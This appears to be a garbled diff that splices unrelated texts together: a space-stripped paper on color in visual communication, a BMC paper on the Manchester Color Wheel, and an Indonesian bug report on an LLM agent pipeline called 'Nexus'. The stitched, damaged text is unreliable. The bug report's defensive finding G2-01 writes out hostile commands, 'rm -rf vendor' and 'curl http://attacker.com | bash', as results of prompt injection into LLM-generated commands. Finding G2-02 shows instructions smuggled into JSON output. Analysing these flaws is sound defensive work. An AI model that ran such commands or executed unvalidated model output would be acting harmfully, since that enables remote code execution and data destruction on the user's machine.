+Coca-Colaataglance,butalsoconveysthebrand'svitalityandenthusiasm.Similarly,Apple'ssilverandwhitecombinationalso
+representsthebrand'ssimplicity,fashionandhigh-end;digitaltechnologyprovidesmorepossibilitiesfortheculturalexpression
+andbrandingofcolorinvisualcommunication,realizingthedynamicchangesandinteractiveeffectsofcolor,makingtheroleof
+colorinbrandingmoreprominentandvivid.Forexample,somebrandswillusedigitalmeans,indifferentscenesandactivities,
+throughcolorchangestoconveydifferentinformationandemotionsofthebrand,toenhancetheinteractivityandexperienceof
+thebrand.Inthewholeprocess,thecolor,visualcommunicationandbrandwillestablishmorelinks,thecharacteristicsofits
+settingsandtheneedsofthetargetaudience,butalsotocreateabrandcultureinlinewiththevisualimagethatcanattract
+consumers,promptingtheroleofculturalexpressionandbrandingwillbemorein-depthexcavationandapplication.
+## CONCLUSION
+Inconclusion,theaboveisanin-depthdiscussionandpracticalresearchontheroleofcolorinvisualcommunicationunder
+thedigitalperspective.Colorplaysapivotalroleindigitalvisualcommunication,notonlyasavisualelement,butalsoasacarrier
+
+LyuH./MAA,25(1),352-357
+MediterraneanArchaeologyandArchaeometry,Vol.25,No1,(2025),pp.352-357
+## 356
+ofemotionandamediumofinformation,whichcaneffectivelyconveythedesigner'sintentionandtheaudience'sneeds.Driven
+bydigitaltechnology,theuseofcolorhasbecomemoreflexibleanddiverse,bringingunprecedentedpossibilitiesforvisual
+communication.Butatthesametime,facingthecomplexbackgroundofreferences,itisnecessarytoestablishcorresponding
+linksforcolormanagementandcolorinnovation,strengthenthespeedandefficiencyofcolordifferentiation,andstimulatethe
+enthusiasmoflearnerstoexploreandinnovatecontinuously.Together,wewillexplorethenewapplications,trendsandmethods
+ofcolorindigitalvisualcommunication,andcontributemorewisdomandstrengthtothedevelopmentofvisualcommunication.
+## .
+
+LyuH./MAA,25(1),352-357
+MediterraneanArchaeologyandArchaeometry,Vol.25,No1,(2025),pp.352-357
+## 357
+## REFERENCES
+[1]MacdonaldI.Windowontheweather:acasestudyinmulti-platformvisualcommunicationdesign,witharelationshipto
+DesignThinking:[J].VisualCommunication,2023,22(2):365-386.
+[2]ZZhang,RWang.TheResearchOrigin,AcademicApproachandKnowledgePedigreeofVisualCommunicationinChina
+(1986-2022)[J].ChineseJournalofJournalism&Communication,2023,45(1):84-105.
+[3]YangZ,WenC,LuoHZT.ACSiam:AsymmetricconvolutionstructuresforvisualtrackingwithSiamese
+network[J].Journalofvisualcommunication&imagerepresentation,2022,84(4):1.1-1.10.
+[4]HaskoJ,RiveraMC,ErbacherMK,etal.VisualAnalysisPlusHierarchicalLinearModelRegressions:Morphosyntax
+InterventionwithDeaf-and-Hard-of-HearingStudents:[J].CommunicationDisordersQuarterly,2022,43(3):195-205.
+[5]RitaBrdar-Szabó,BrdarM.Culturalmodelsmediatingbetweenvisualsensationandsemioticsystems,exemplifiedon
+visual,alpha-pictorialandverbal-gesturalcommunication:[J].CognitiveLinguisticStudies,2023,10(2):367-397.
+[6]WeiM,SunY,LiS,etal.Single-cellprofilingrevealsMüllergliacoordinateretinalintercellularcommunicationduring
+light/darkadaptationviathyroidhormonesignaling[J].ProteinsandCells,2023,14(8):603-617.
+[7]SawadwuthikulG,TothongT,LodkaewT,etal.VisualGoalHuman-RobotCommunicationFrameworkwithFew-Shot
+Learning:aCaseStudyinRobotWaiterSystem[J].IEEETransactionsonIndustrialInformatics,2022,18(3):1883-1891.
+[8]LiS,LiJ.DesignofMedicalGraphicAidedVisualElementsActiveCommunicationAlgorithminPrint
+Advertising[J].JournalofTestingandEvaluation:AMultidisciplinaryForumforAppliedSciencesandEngineering,2023,
+## 51(1):97-106.
+[9]HashemiH,ShahidiA,HashemiA,etal.Theprevalenceofred-greencolorvisiondeficiencyanditsrelatedfactorsinan
+elderlypopulationabove60yearsofage[J].InternationalJournalofOphthalmology,2023,16(9):1535-1541.
+[10]GaoJG,TianM.PrevalenceofcolorvisiondeficiencyamongChinesecollegestudentsandtheirqualityoflife[J].
+InternationalJournalofOphthalmology,2023,16(9):1542-1548.
+[11]TompkinsN,GuntherKL.ColorVisionDeficiencyandTeachingElectromagnetism[J].ThePhysicsTeacher,2022,
+## 60(6):466-468.
+[12]ChenC,LieZ,FuL.Perovskitephotodetector-basedsinglepixelcolorcameraforartificialvision[J].Light:Scienceand
+## Applications,2023,12(4):509-511.
+[13]OhkobaM,IshikawaT,HiraS,etal.Colorrepresentationsofnormalsandcongenitalred–greencolordeficiencies:
+Estimationofindividualresultsbasedoncolorvisionmodel[J].ColorResearchAndApplication,2022,47(3):565-584.
+[14]Zhi-JunW,Shuai-RuiG.StudyonFutonPatternsinMuralofBuddhistTempleinWutaiMountainunderDigital
+Vision[J].LiteratureandArtResearch,2023,13(3):199-209.
+[15]FreethPJ.Peripheralvisionandchallenginginvisibilities:Theoreticalandmethodologicalreflectionsonthe"digitized
+turn"and"born-digital"sourcesinarchivesoftranslationandtranslators[J].TranslationinSociety,2023,2(2):213-234.
+[16]BernackiJ,SchererR.RemarksonSpeedinguptheDigitalCameraIdentificationusingConvolutionalNeural
+Networks[J].VietnamJournalofComputerScience,2023,10(04):537-555.
+[17]GroshevM,BaldoniG,CominardiL,etal.Edgerobotics:areweready?anexperimentalevaluationofcurrentvisionand
+futuredirections[J].DigitalCommunicationandNetworks,2023,9(1):166-174.
+[18]MiaoziT,WuyunLU.MythandDigitalFantasyfromthePerspectiveofTechnicalAesthetics[J].Landscaperesearch,
+## 2023,15(2):85-88.
+[19]LinJ,SunG,ShenJ,etal.Fromcomputervisiontoshorttextunderstanding:Applyingsimilarapproachesintodifferent
+disciplines[J].IntelligentandConvergedNetworks,2022,3(2):161-172.
+[20]ChenT,WuZ,HuL,etal.Thevisualnaturalnesseffect:Impactofnaturallogosonbrandpersonality
+perception[J].InternationalJournalofConsumerStudies,2023,47(4):1351-1363.
+[21]KumarD,JoharjiL,LiH,etal.Artificialvisualperceptionneuralsystemusingasolution-processableMoS_(2)-based
+in-memorylightsensor[J].Light:ScienceandApplications,2023,12(8):1583-1594.
+[22]ZhangS,ShanJ,SunF,etal.Multimodefusionperceptionfortransparentglassrecognition[J].IndustrialRobot:the
+internationaljournalofroboticsresearchandapplication,2022,49(4):625-633.
+[23]LeeJ,ParkS.Currentdesignguidelines’streetscapeimprovementforvisualperceptionandwalkability:Acasestudyof
+SejongCity,RepublicofKorea[J].FrontiersofArchitectureResearch,2023,12(3):423-443.
+[24]GuanZ,LinM,WuQ,etal.Neuralmechanismsoftop-downdividedandselectivespatialattentioninvisualand
+auditoryperception[J].Neuroscience,2023,9(2):95-113.
+[25]JLiu,YGuoDigitalmodelingandsimulationofdistributedphotovoltaicpowergenerationgridconnection[J].Computer
+## Simulation,2022,39(9):96-100.
 
 ---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, vcs, api]
 
-## Klasifikasi
+### 📘 KNOWLEDGE: NEXUS_1471-2288-10-12.MD
 
-| Kode | Severity | Kategori |
-|------|----------|----------|
-| G2-01 | 🔴 Kritis | Logic Bug |
-| G2-02 | 🔴 Kritis | Security |
-| G2-03 | 🔴 Kritis | Data Integrity |
-| G2-04 | 🔴 Kritis | Concurrency |
-| G2-05 | 🟡 Sedang | Logic Bug |
-| G2-06 | 🟡 Sedang | Performance |
-| G2-07 | 🟡 Sedang | Logic Bug |
-| G2-08 | 🟡 Sedang | Data Integrity |
-| G2-09 | 🟡 Sedang | Logic Bug |
-| G2-10 | 🟢 Minor | Reliability |
-| G2-11 | 🟢 Minor | Correctness |
-| G2-12 | 🟢 Minor | Logic |
-
----
-
-## 🔴 Bug Kritis
-
----
-
-### G2-01 — `COMMAND_EXEC` di Modifier Adalah Arbitrary Code Execution
-**File:** `agent/core/Modifier.js`, baris ~45  
-**Kode aktual:**
-```javascript
-case 'COMMAND_EXEC':
-    const { execSync } = require('child_process');
-    execSync(action.command, { cwd: this.rootPath, stdio: 'ignore' });
-    return true;
-```
-
-**Mengapa ini akan meledak setelah R-01 selesai:**  
-Setelah `spawnRealLaravel()` diimplementasikan dan pipeline benar-benar berjalan, `COMMAND_EXEC` akan digunakan aktif — untuk `composer install`, `artisan migrate`, dan seterusnya. Masalahnya: `action.command` adalah string bebas yang datang dari hasil LLM (`blueprintApp` → `generate_architecture`). LLM bisa menghasilkan command apa saja.
-
-**Skenario kegagalan konkret:**
-- LLM menghasilkan blueprint dengan `"command": "rm -rf vendor && composer install"` → vendor terhapus
-- LLM menghasilkan `"command": "curl http://attacker.com | bash"` jika prompt injection berhasil
-- `execSync` bersifat **synchronous dan blocking** — satu command yang hang (misal `composer install` lambat) memblokir seluruh event loop Node.js
-
-**Fix:**
-```javascript
-// 1. Ganti execSync dengan spawn async
-// 2. Tambahkan whitelist command yang diizinkan
-const ALLOWED_COMMANDS = ['composer', 'php', 'npm', 'node'];
-const cmdParts = action.command.split(' ');
-if (!ALLOWED_COMMANDS.includes(cmdParts[0])) {
-    throw new Error(`COMMAND_EXEC: Command "${cmdParts[0]}" not in whitelist`);
-}
-// 3. Gunakan spawn, bukan execSync
-await spawnAsync(cmdParts[0], cmdParts.slice(1), { cwd: this.rootPath });
-```
-
----
-
-### G2-02 — `blueprintApp()` Mem-parse JSON dari LLM Tanpa Validasi Schema
-**File:** `agent/core/NexusEngine.js`, metode `blueprintApp()`  
-**Kode aktual:**
-```javascript
-const jsonMatch = response.match(/\{[\s\S]*\}/);
-const blueprint = JSON.parse(jsonMatch ? jsonMatch[0] : response);
-await fs.writeJson(blueprintPath, blueprint, { spaces: 2 });
-```
-
-**Mengapa ini akan meledak:**  
-Setelah pipeline berjalan end-to-end, `blueprint` menjadi sumber kebenaran untuk seluruh `ImplementationPhase` — menentukan model apa yang dibuat, migration apa yang dijalankan, dan Livewire component apa yang di-generate. LLM tidak selalu menghasilkan struktur yang persis sama.
-
-**Skenario kegagalan konkret:**
-- LLM menambahkan key tambahan: `"dependencies": ["laravel/telescope"]` → `ImplementationPhase` mengiterasi key yang tidak dikenal, tidak error, tapi menghasilkan file-file aneh
-- LLM menghasilkan `"models": "User"` (string, bukan array) → `for (const model of models)` throw `TypeError: models is not iterable`
-- LLM menambahkan instruksi dalam natural language di dalam JSON: `"models": ["User", "IMPORTANT: also add Admin model"]` → file bernama `IMPORTANT: also add Admin model.php` dibuat di filesystem
-
-**Fix:**
-```javascript
-const BLUEPRINT_SCHEMA = {
-    required: ['project_name', 'models', 'migrations', 'livewire_components'],
-    arrays: ['models', 'migrations', 'livewire_components'],
-    strings: ['project_name']
-};
-
-function validateBlueprint(bp) {
-    for (const key of BLUEPRINT_SCHEMA.required) {
-        if (!(key in bp)) throw new Error(`Blueprint missing required key: ${key}`);
-    }
-    for (const key of BLUEPRINT_SCHEMA.arrays) {
-        if (!Array.isArray(bp[key])) throw new Error(`Blueprint key "${key}" must be array`);
-        // Sanitize: hanya izinkan nama yang valid (alphanumeric + underscore)
-        bp[key] = bp[key].filter(v => typeof v === 'string' && /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(v));
-    }
-    return bp;
-}
-```
-
----
-
-### G2-03 — `wrapAsConditional()` Menyebabkan Collision Accumulation yang Tidak Pernah Diselesaikan
-**File:** `agent/core/NexusEngine.js`, metode `wrapAsConditional()`  
-**File terkait:** `agent/core/phases/KnowledgePhase.js`, metode `harvest()`
-
-**Kode aktual:**
-```javascript
-// NexusEngine.js
-wrapAsConditional(existing, added, context = 'Nexus Knowledge') {
-    return `\n# NEXUS COLLISION RESOLVED: ${context}\nOpsi A:\n${existing}\nOpsi B:\n${added}\n`;
-}
-
-// KnowledgePhase.js - saat harvest menemukan file yang sudah ada:
-const merged = this.engine.wrapAsConditional(oldContent, newContent, `Collision in ${file}...`);
-await fs.writeFile(targetPath, merged);
-```
-
-**Mengapa ini akan meledak setelah knowledge loop aktif:**  
-Setiap kali sandbox ke-2, ke-3, ke-4 di-harvest dan menemukan file knowledge yang sudah ada, file itu di-wrap lagi. Tidak ada mekanisme yang menyelesaikan collision ini secara otomatis. Setelah 10 sandbox, satu file knowledge bisa berisi 10 level nesting `Opsi A / Opsi B`.
-
-**Skenario kegagalan konkret:**
-- `Distiller.simplifyContent()` mencoba meringkas file yang isinya adalah collision block bersarang → LLM menghasilkan ringkasan tidak koheren
-- `getSemanticTags()` mencari regex `METADATA` tapi terhalang oleh collision headers → semantic index tidak dibangun
-- File knowledge tumbuh eksponensial: 100 sandbox × rata-rata 5 collision = file berukuran puluhan MB
-
-**Fix:** Tambahkan collision resolver otomatis di `MemoryPipeline.processHarvestData()` — gunakan `DecisionEngine` yang sudah ada untuk memilih versi terbaik, atau merge secara semantic, bukan hanya append.
-
----
-
-### G2-04 — `ParallelRunner` Membuang Semua Hasil Jika Satu Worker Throw
-**File:** `agent/core/ParallelRunner.js`  
-**Kode aktual:**
-```javascript
-static async run(items, taskFn, limit = 3) {
-    const results = new Array(items.length);
-    let index = 0;
-    
-    const worker = async () => {
-        while (index < items.length) {
-            const currentIndex = index++;
-            try {
-                results[currentIndex] = await taskFn(items[currentIndex]);
-            } catch (e) {
-                results[currentIndex] = e;
-                throw e;  // ← INI MASALAHNYA
-            }
-        }
-    };
-
-    const workers = [];
-    for (let i = 0; i < Math.min(limit, items.length); i++) {
-        workers.push(worker());
-    }
-
-    await Promise.all(workers);  // ← Jika satu throw, semua dibatalkan
-    return results;
-}
-```
-
-**Mengapa ini akan meledak:**  
-`AuditPhase` memanggil `ParallelRunner.run(specialists, ...)` dengan 6 specialist. Jika specialist ke-3 (misal `database-architect`) throw error karena project tidak punya database files, `Promise.all` akan **reject seluruh batch**. Hasil dari specialist 1 dan 2 yang sudah selesai dengan sukses dibuang begitu saja.
-
-**Skenario konkret:**  
-Project baru yang di-audit tidak punya `database/` folder. `database-architect` scanner throw "No migration files found". Seluruh audit phase gagal. Laporan dari `cyber-security`, `ux-engineer`, dan `seo-performance` yang sudah selesai tidak pernah tersimpan.
-
-**Fix:**
-```javascript
-} catch (e) {
-    results[currentIndex] = { error: e.message, severity: 'SCANNER_ERROR' };
-    // Jangan throw — catat error tapi lanjut ke item berikutnya
-}
-```
-
----
-
-## 🟡 Bug Sedang
-
----
-
-### G2-05 — `blueprintApp()` Hanya Berjalan Jika README Mengandung Magic String
-**File:** `agent/core/NexusEngine.js`  
-**Kode aktual:**
-```javascript
-async blueprintApp(options = {}) {
-    const readmePath = path.join(this.rootPath, 'README.md');
-    if (!(await fs.pathExists(readmePath))) return;
-    const readmeContent = await fs.readFile(readmePath, 'utf8');
-    if (!readmeContent.includes('Generated by Nexus Autonomous Pipeline')) return;
-    // ...
-}
-```
-
-**Masalah:**  
-`blueprintApp` hanya berjalan jika README mengandung string `'Generated by Nexus Autonomous Pipeline'`. Sandbox yang dibuat oleh `spawnRealLaravel()` (setelah R-01 difix) menggunakan template Laravel default yang **tidak mengandung string ini**. Artinya `blueprintApp` selalu di-skip → tidak ada blueprint → `ImplementationPhase` selalu skip karena `NEXUS_BLUEPRINT.json` tidak ada.
-
-**Dampak:** Seluruh code generation phase tidak pernah berjalan pada project baru yang di-spawn.
-
-**Fix:** Buat `spawnRealLaravel()` menulis README dengan magic string tersebut, atau ubah kondisi menjadi opt-in yang lebih fleksibel:
-```javascript
-const isNexusManaged = readmeContent.includes('Generated by Nexus') || 
-                       await fs.pathExists(path.join(this.rootPath, 'NEXUS_BLUEPRINT.json'));
-if (!isNexusManaged) return;
-```
-
----
-
-### G2-06 — `MemoryGovernor.ensureDirectories()` Dipanggil Synchronous di Constructor
-**File:** `agent/core/MemoryGovernor.js`  
-**Kode aktual:**
-```javascript
-constructor(rootPath) {
-    this.rootPath = rootPath;
-    this.memoryPath = path.join(this.rootPath, 'memory');
-    this.ensureDirectories(); // ← synchronous fs call di constructor
-}
-
-ensureDirectories() {
-    const dirs = ['raw', 'normalized', 'semantic', 'distilled', ...];
-    dirs.forEach(dir => {
-        fs.ensureDirSync(path.join(this.memoryPath, dir)); // ← blocking I/O
-    });
-}
-```
-
-**Masalah:**  
-`NexusEngine` membuat `new MemoryGovernor(rootPath)` di constructor-nya. Ini memicu 7 `fs.ensureDirSync` secara synchronous di startup. Pada sistem dengan I/O lambat (NFS mount, Docker volume, Windows dengan antivirus), ini bisa memblokir thread utama 100-500ms per direktori.
-
-Setelah R-01 difix dan 100 sandbox berjalan, ini menjadi bottleneck nyata — setiap sandbox spawn membuat `NexusEngine` baru (atau me-reset root path), dan setiap reset memicu 7 blocking I/O calls lagi.
-
-**Fix:** Ubah `ensureDirectories()` menjadi async dan panggil di `initRedis()` atau buat `static async create(rootPath)` factory method.
-
----
-
-### G2-07 — `Machinist.integrate()` Memodifikasi `NexusEngine.js` dengan String Replacement Rapuh
-**File:** `agent/core/Machinist.js`  
-**Kode aktual:**
-```javascript
-async integrate(name, type = 'auditor') {
-    let content = await fs.readFile(this.enginePath, 'utf8');
-    
-    const requireAnchor = "const Distiller = require('./Distiller');";
-    content = content.replace(
-        requireAnchor,
-        `${requireAnchor}\nconst ${name} = require('${relPath}');`
-    );
-
-    const initAnchor = "this.distiller = new Distiller(this.knowledgePath);";
-    content = content.replace(
-        initAnchor,
-        `${initAnchor}\n        this.${instanceName} = new ${name}(this.rootPath);`
-    );
-
-    await fs.writeFile(this.enginePath, content);
-}
-```
-
-**Masalah:**  
-`Machinist.integrate()` memodifikasi source code `NexusEngine.js` hidup-hidup dengan mencari string literal `"const Distiller = require('./Distiller');"` sebagai anchor point. Ini akan gagal jika:
-1. Developer menambahkan komentar setelah baris tersebut
-2. Format file berubah (prettier/eslint auto-format mengubah spasi/quotes)
-3. `integrate()` dipanggil dua kali untuk komponen berbeda → anchor pertama mungkin sudah berubah karena inject pertama
-
-Setelah pipeline aktif dan Machinist mulai di-invoke untuk forging scanner baru, setiap call ke `integrate()` yang gagal meninggalkan `NexusEngine.js` dalam kondisi parsial-corrupt (anchor diganti tapi tidak semua inject berhasil).
-
-**Fix:** Gunakan AST parser (seperti `@babel/parser` atau `acorn`) untuk modifikasi kode, bukan string replacement. Atau gunakan sentinel comment yang lebih robust: `// NEXUS_INJECT_REQUIRE` dan `// NEXUS_INJECT_INIT`.
-
----
-
-### G2-08 — `MemoryPipeline.processHarvestData()` Menghapus Folder Harvest Setelah Proses
-**File:** `agent/core/MemoryPipeline.js`  
-**Kode aktual:**
-```javascript
-async processHarvestData() {
-    // ... proses file harvest ...
-    
-    await fs.emptyDir(harvestPath);  // ← Hapus semua setelah proses
-    console.log('   🧹 Harvest folder recycled.');
-}
-```
-
-**Masalah:**  
-`golden/harvest/` dikosongkan setelah setiap `processHarvestData()`. Jika proses di tengah-tengah crash (misalnya `versionedWrite()` gagal karena disk penuh), beberapa file sudah diproses dan dihapus dari harvest, tapi belum semua masuk ke HUB. Tidak ada cara untuk replay atau recovery. Data dari sandbox yang sudah di-destroy hilang permanen.
-
-**Fix:** Gunakan move-then-delete, bukan copy-then-delete. Atau tambahkan transaction log: catat file yang sudah berhasil di-ingest sebelum `emptyDir`.
-
-```javascript
-const processedLog = path.join(harvestPath, '.processed.json');
-const processed = [];
-for (const file of files) {
-    await this.versionedWrite(dest, content);
-    processed.push(file);
-    await fs.writeJson(processedLog, processed); // checkpoint
-}
-// Hanya hapus setelah semua berhasil tercatat
-await fs.emptyDir(harvestPath);
-```
-
----
-
-### G2-09 — `Modifier.fileReplace()` Throw Jika Target Content Tidak Ditemukan (Tidak Di-handle)
-**File:** `agent/core/Modifier.js`  
-**Kode aktual:**
-```javascript
-async fileReplace(filePath, targetContent, replacementContent) {
-    if (await fs.pathExists(filePath)) {
-        let content = await fs.readFile(filePath, 'utf8');
-        if (content.includes(targetContent)) {
-            const newContent = content.replace(targetContent, replacementContent);
-            await fs.writeFile(filePath, newContent);
-            return true;
-        }
-        throw new Error(`Target content not found in file: ${filePath}`); // ← throw tanpa context
-    }
-    throw new Error(`File not found: ${filePath}`);
-}
-```
-
-**Masalah:**  
-`FILE_REPLACE` action dari `PlanningPhase` menggunakan content yang dihasilkan LLM sebagai `targetContent`. LLM mungkin menghasilkan konten yang sedikit berbeda dari file aktual (whitespace, newline, encoding). Akibatnya `fileReplace` selalu throw pada iterasi kedua ke atas karena file sudah dimodifikasi oleh iterasi pertama.
-
-Di `ExecutionPhase`, error ini hanya di-catch dan dicatat sebagai `task.status = 'failed'` — lalu `continue` ke task berikutnya. Tidak ada rollback. Setelah 10 task, mungkin 6 berhasil dan 4 gagal diam-diam.
-
-**Dampak nyata:** Developer melihat "✅ Execution phase completed" tapi setengah task tidak benar-benar dieksekusi.
-
-**Fix:** `FILE_REPLACE` harus menjadi `FILE_PATCH` yang menggunakan diff/patch semantics, bukan exact string match. Atau tambahkan fuzzy matching dengan normalisasi whitespace sebelum cek `includes()`.
-
----
-
-## 🟢 Bug Minor
-
----
-
-### G2-10 — `LocalIntelligence` Circuit Breaker Tidak Pernah Kembali ke CLOSED
-**File:** `agent/core/LocalIntelligence.js`  
-**Kondisi:** Saat `failures >= threshold`, state berubah ke `OPEN`. Setelah `HALF_OPEN`, jika satu request berhasil, seharusnya kembali ke `CLOSED`. Jika implementasi HALF_OPEN tidak ada (atau hanya state label tanpa logika), circuit breaker hanya bisa OPEN permanen untuk satu session.
-
-**Dampak:** Jika Ollama sempat timeout sekali di awal session, seluruh code generation diblokir untuk sisa session itu meskipun Ollama sudah kembali normal.
-
----
-
-### G2-11 — `ensureEnv()` di Modifier Menggunakan Path yang Salah
-**File:** `agent/core/Modifier.js`  
-**Kode aktual:**
-```javascript
-async ensureEnv(filePath, key, value) {
-    const envFile = path.resolve(this.rootPath, '.env');
-    // ↑ Parameter `filePath` diabaikan sepenuhnya — selalu pakai rootPath/.env
-```
-
-**Masalah:** `action.target` dari task yang memanggil `ENV_ENSURE` sepenuhnya diabaikan. Jika task dimaksudkan untuk memodifikasi `.env` di dalam sandbox (bukan di rootPath), perubahan malah ditulis ke `.env` NEXUS engine itu sendiri.
-
----
-
-### G2-12 — `getSemanticTags()` Regex Hanya Menangkap Satu Tag Block Per File
-**File:** `agent/core/NexusEngine.js`  
-**Kode aktual:**
-```javascript
-const match = content.match(/>\\s*\\*\\*METADATA.*\\*\\*:\\s*\\[(.*)\\]/i);
-if (match) return match[1].split(',').map(t => t.trim().toLowerCase());
-```
-
-**Masalah:** `String.match()` tanpa flag `g` hanya menangkap kemunculan pertama. Setelah collision wrapping terjadi berulang kali (lihat G2-03), satu file bisa punya beberapa `METADATA` block. Hanya block pertama yang terbaca. Semantic index tidak lengkap.
-
----
-
-## Ringkasan: Urutan Munculnya Bug
-
-Setelah bug generasi pertama diselesaikan, urutan bug berikut yang paling mungkin muncul pertama kali berdasarkan jalur eksekusi:
-
-```
-nexus run (pertama kali setelah fix)
-    │
-    ├─ blueprintApp() ──────────────── [G2-05] magic string → blueprint tidak dibuat
-    │
-    ├─ AuditPhase (6 specialists)
-    │   └─ ParallelRunner ───────────── [G2-04] satu scanner error → semua dibatalkan
-    │
-    ├─ ImplementationPhase
-    │   └─ blueprintApp() skip
-    │       └─ LLM generate JSON ──── [G2-02] schema tidak valid → TypeError di loop
-    │
-    ├─ ExecutionPhase
-    │   └─ COMMAND_EXEC ─────────────── [G2-01] blocking execSync, no whitelist
-    │   └─ FILE_REPLACE ─────────────── [G2-09] target content tidak ditemukan
-    │
-    └─ KnowledgePhase (harvest ke-2 dst)
-        └─ collision ─────────────────── [G2-03] wrapAsConditional bertumpuk
-        └─ emptyDir crash ───────────── [G2-08] data hilang tanpa recovery
-```
-
-**Bug yang paling berbahaya untuk diselesaikan lebih dulu (sebelum G2-01):** G2-04, karena ia menyembunyikan semua bug lain — jika satu scanner gagal, kamu tidak akan pernah tahu scanner mana yang berhasil dan mana yang tidak.
-
----
-
-*Analisis ini berdasarkan pembacaan langsung file: `Modifier.js`, `NexusEngine.js` (blueprintApp, wrapAsConditional), `ParallelRunner.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `Machinist.js` (integrate), `LocalIntelligence.js`, `MemoryGovernor.js`.*
-
-
----
-> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]
-
-### 📘 KNOWLEDGE: NEXUS_NEXUS VECTOR SEARCH UPGRADE.MD
-
-# 🧠 NEXUS UPGRADE PLAN: Vector Semantic Search Engine (v3.2.0)
 > **VERSION**: v1 | **Last Updated**: 26/05/2026
 
 
 
-> **STATUS**: Ready for Implementation  
-> **Priority**: 🔴 Critical  
-> **Target File**: `agent/core/Distiller.js` + `agent/core/NexusEngine.js`  
-> **Author**: Nexus Senior AI Engineer Review  
-> **Date**: 2026-05-13
+RESEARCH ARTICLEOpen Access
+The Manchester Color Wheel: development of a
+novel way of identifying color choice and its
+validation in healthy, anxious and depressed
+individuals
+## Helen R Carruthers
+## 1
+## , Julie Morris
+## 2
+## , Nicholas Tarrier
+## 3
+## , Peter J Whorwell
+## 1*
+## Abstract
+Background:For the purposes of our research programme we needed a simple, reliable and validated method for
+allowing choice of a color in response to a series of questions. On reviewing the literature no such instrument was
+available and this study aimed to rectify this situation. This was achieved by developing a simple method of
+presenting a series of colors to people validating it in healthy volunteers and in individuals where color choice
+might be distorted, namely anxiety and depression.
+Methods:A series of different presentations of four shades of eight colors and grey, as well as black and white
+were evaluated.‘Mood’,‘favourite’and‘drawn to’colors were assessed in 105 healthy, 108 anxious and 110
+depressed participants. The positive, neutral or negative attribution of these colors was recorded in a further 204
+healthy volunteers.
+Results:The circular presentation of colors was most favoured (Color Wheel). Yellow was the most‘drawn to’color
+and blue the commonest‘favourite’color in all subjects. Yellow was most often associated with a normal mood
+and grey with an anxious or depressed mood. Different shades of the same color had completely different positive
+or negative connotations. Reproducibility was exceptionally high when color choice was recorded in positive,
+neutral or negative terms.
+Conclusions:The Color Wheel could be used to assess health status, mood or even treatment outcome in a
+variety of clinical situations. It may also have utility in circumstances where verbal communication may not be
+optimal, such as with children.
+## Background
+We have recently been studying the imagery of irritable
+bowel syndrome and shown that patients who have an
+image of their condition respond better to hypnotherapy
+than those who don’t [1]. Furthermore, the response
+was even better if the image was in color. This has led
+us to speculate that how patients relate their illness or
+mood to color might be an area worthy of further
+investigation.
+Colors are frequently used to describe emotions such
+as‘green with envy’,‘red with rage’and being‘in the
+blues’when depressed. Although there is a large, often
+anecdotal, literature on color preferences [2-4] as well
+as the relationship of color to mood[5,6] and emotion
+[2,7,8] there has been relatively little systematic research
+on the subject [9-13]. Furthermore we could not find a
+single validated questionnaire specifically designed to
+rapidly identify color preferences in any previous investi-
+gations. When instruments have been developed such as
+the Color Pyramid test,[14] the Rorschach Inkblot test,
+[15] the Lüscher Color test,[16] the Lowenfeld Mosaic
+test[17] and the Stroop test[18] they have been designed
+more to interpret, for instance personality or cognitive
+processing, rather than allowing a subject to simply
+select a single color to represent their mood or disease.
+- Correspondence: peter.whorwell@manchester.ac.uk
+## 1
+Department of Medicine, University of Manchester, Manchester, UK
+Carrutherset  al.BMC  Medical Research  Methodology2010,10:12
+http://www.biomedcentral.com/1471-2288/10/12
+© 2010 Carruthers et al; licensee BioMed Central Ltd. This is an Open Access article distributed under the terms of the Creative
+Commons Attribution License (http://creativecommons.org/licenses/by/2.0), which permits unrestricted use, distribution, and
+reproduction in any medium, provided the original work is properly cited.
+
+It was therefore felt that it would be worth developing
+a color questionnaire which could present a reasonably
+wide range of colors in the form of a palette, similar to
+those used in paint charts, which would suit our pur-
+pose but may also have utility in a wide range of other
+areas of investigation anddiagnosis. Validation was
+undertaken in normal individuals with respect to their
+‘drawn to’,‘favourite’and‘mood’color choice with the
+purpose of identifying a‘normal range’of responses. In
+addition, anxious and depressed subjects were also stu-
+died as it was anticipated that their color choice might
+be distorted by their mood and this would aid the vali-
+dation process by assessingdiscrimination between
+mood states. Furthermore, it was considered likely that
+different shades of the same color, for instance pale
+green and dark green, could have completely different
+connotations for the individual. Consequently, the posi-
+tive and negative attributions of the colors in the ques-
+tionnairewerealsoassessedaspartofthevalidation
+process.
+## Methods
+Preparation of material
+- Choice of colors
+It was decided to include samples of six easily identifi-
+ablecolorsgroups:red,orange,yellow,green,blueand
+purple. These colors correspond, at least in nomencla-
+ture, to the five principal color groups of the Munsell
+system, with the addition of orange as a separately iden-
+tified color (instead of Munsell’s Yellow-Red). It also
+seemed reasonable to use pink and brown as these
+might be related to bodily tissues and functions. Finally,
+we added black and white, two achromatic colors. It was
+felt that different shades of each color should be
+included as they may help the patient to discriminate
+the exact color of their choice. In addition dark versus
+light shades of a color might have different connotations
+for an individual. Thus four shades of each chromatic
+color and four additional shades of the achromatic color
+(grey shades) were included resulting in 38 colors in
+total. The colors with their L*a*b* D50 (CIE 1931; 2
+degree Observer) coordinates are shown in Figure 1.
+The spectrums of the printed colors were measured
+with an i1-Pro spectrophotometer (X-Rite, Grand
+Rapids, Michigan, USA) and the spectral data processed
+according to the CIE Publication 15-2004 (Colorimetry,
+3rd Edition) in order to compute the L*a*b* values
+shown in the figure.
+- Presentation of colors
+Five differing formats of presentation varying in shape
+and arrangement of colors (two linear, two tabular, one
+circular) were tested on three focus groups and the cir-
+cular presentation, called the‘Color Wheel’(Figure 2),
+was the unanimous choice of the three groups. As can
+## L*a*b*
+## L*a*b* D50
+## 94.91.98-9.21
+## 18.4-0.650.32
+## 22.9-8.44-5.08
+## 43.8-10.6-11.1
+## 64.1-6.01-12.6
+## 82.8-1.58-10.2
+## 54.752.053.9
+## 59.442.358.8
+## 71.819.067.8
+## 82.43.6873.6
+## 19.513.5-38.6
+## 25.64.05-44.0
+## 38.6-11.3-45.2
+## 53.1-14.8-42.2
+## 46.760.720.2
+## 59.543.113.7
+## 72.423.76.71
+## 86.67.671.27
+## 24.828.9-22.0
+## 34.646.7-19.3
+## 43.853.1-13.1
+## 64.731.9-13.6
